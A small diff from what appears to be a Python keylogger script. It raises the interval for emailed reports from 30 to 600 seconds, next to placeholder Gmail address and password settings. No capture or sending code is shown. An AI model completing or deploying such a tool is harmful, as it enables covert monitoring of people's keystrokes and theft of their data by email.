@@ -5,7 +5,7 @@ import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Semaphore, Timer
 
-SEND_REPORT_EVERY = 30 # 10 minutes
+SEND_REPORT_EVERY = 600 # 10 minutes
 EMAIL_ADDRESS = "YourEmailId@gmail.com"
 EMAIL_PASSWORD = "YourPassword"
 
